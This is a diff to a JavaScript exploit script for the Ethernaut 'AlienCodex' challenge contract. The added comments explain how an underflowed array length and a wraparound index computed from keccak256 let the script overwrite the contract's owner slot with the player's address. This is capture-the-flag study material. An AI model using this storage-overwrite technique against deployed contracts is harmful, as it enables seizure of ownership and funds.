@@ -25,11 +25,17 @@ const attackAlienCodex = async () => {
     const tx2 = await contract.retract();
     const tx2Receipt = await tx2.wait(1);
     console.log(tx2Receipt);
-    // note here
+    // we need to calculate the index where slot for owner is located
+    // according to allocation rules, is determined by as keccak256(slot):
     const abi = ethers.utils.defaultAbiCoder;
     const params = abi.encode(["uint256"], [1]);
     const position = await ethers.utils.keccak256(params);
-    // notes here
+    // storage as below
+    // Slot        Data
+    // ------------------------------
+    // 0             owner address, contact bool
+    // 1             codex.length
+    // Use BigInt for mathematical calculations between very large numbers.
     const i = BigInt(2 ** 256) - BigInt(position);
     const _content = "0x" + "0".repeat(24) + playerAddress.slice(2);
     const tx3 = await contract.revise(i, _content);
